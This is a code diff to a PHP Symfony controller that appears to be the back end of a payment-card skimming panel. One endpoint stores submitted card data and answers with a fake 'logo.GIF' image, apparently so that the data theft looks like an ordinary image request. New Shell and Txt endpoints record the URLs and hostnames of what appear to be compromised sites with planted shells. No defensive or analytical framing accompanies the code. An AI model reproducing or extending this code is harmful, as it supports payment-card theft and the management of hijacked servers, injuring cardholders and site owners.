@@ -3,7 +3,9 @@
 namespace Dashboard\RestfullBundle\Controller;
 
 use Dashboard\AdminBundle\Entity\Card;
+use Dashboard\shellsBundle\Entity\shells;
 use Symfony\Bundle\FrameworkBundle\Controller\Controller;
+use Symfony\Component\HttpFoundation\JsonResponse;
 use Symfony\Component\HttpFoundation\Request;
 
 class RestController extends Controller
@@ -50,7 +52,40 @@ class RestController extends Controller
         $card->setCcbank($data["ccbank"]);
         $em->persist($card);
         $em->flush();
+        $filepath = "/var/www/PanelD/web/lib/img/logo.GIF";
+        $filename = "logo.GIF";
+        $response = new Response();
+        $disposition = $response->headers->makeDisposition(ResponseHeaderBag::DISPOSITION_INLINE, $filename);
+        $response->headers->set('Content-Disposition', $disposition);
+        $response->headers->set('Content-Type', 'image/gif');
+        $response->setContent(file_get_contents($filepath));
+        return $response;
 
+
+
+    }
+    public function ShellAction (Request $request)
+    {
+        $data = (array)json_decode($request->getContent());
+        $em = $this->getDoctrine()->getManager();
+        $card = new shells();
+        $card->setUrlhost($data["url"]);
+        $card->setHostname($data["hostname"]);
+        $em->persist($card);
+        $em->flush();
+        return new JsonResponse(array("message"=>"success"));
+
+    }
+    public function TxtAction (Request $request)
+    {
+        $data = (array)json_decode($request->getContent());
+        $em = $this->getDoctrine()->getManager();
+        $card = new shells();
+        $card->setUrlhost($data["url"]);
+        $card->setHostname($data["hostname"]);
+        $em->persist($card);
+        $em->flush();
+        return new JsonResponse(array("message"=>"success"));
 
     }
 }
